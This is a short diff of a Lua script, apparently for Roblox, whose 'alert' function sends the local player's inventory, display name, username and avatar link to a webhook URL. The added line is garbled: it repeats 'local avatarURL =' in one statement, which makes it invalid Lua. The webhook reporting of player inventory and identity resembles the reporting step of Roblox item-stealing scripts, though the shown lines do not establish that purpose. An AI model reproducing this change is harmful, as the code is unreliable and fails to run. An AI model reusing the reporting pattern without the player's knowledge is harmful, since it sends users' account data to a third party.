@@ -66,7 +66,7 @@ local function alert()
 	local message = format(getInv())
 	local displayName = LocalPlayer.DisplayName
 	local username = LocalPlayer.Name
-	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+	local avatarURL = local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
 	local webhookName = displayName .. " (@" .. username .. ")"
 	task.defer(function()
 		send(webhookURL, message, webhookName, avatarURL)
